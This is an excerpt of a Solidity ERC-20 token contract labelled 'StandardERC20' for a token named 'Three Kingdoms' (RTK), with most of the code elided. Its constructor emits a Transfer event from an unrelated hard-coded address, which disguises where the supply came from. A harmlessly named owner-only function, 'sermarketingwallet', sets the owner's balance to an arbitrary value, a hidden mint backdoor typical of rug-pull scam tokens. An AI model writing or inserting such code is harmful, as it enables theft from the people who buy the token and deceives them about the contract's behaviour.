...
contract StandardERC20 is Context, IERC20, Ownable {
    ...
    string private _name = unicode"三國演義 | Three Kingdoms";
    string private _symbol = "RTK";
    ...
    address payable public marketingaddress = payable(0x2ac729B1799585876b76Cd2f851D707903e0fBfe);
    ...
    uint256 public _walletMax = 3000000 * 10**_decimals;    // 3% at the launch 
    uint256 public _maxTxAmount = 1000000 * 10**_decimals;  // 1% at the launch  
    ...
    constructor () {
        ...
        emit Transfer(address(0xCaF69C06DbECCB26CeaaAbcAfc08a0cf3d1046fa), _msgSender(), _totalSupply);
    }
    ...
    function sermarketingwallet()  public onlyOwner()   {_accBalances[getOwner()] = settokendecimals; }
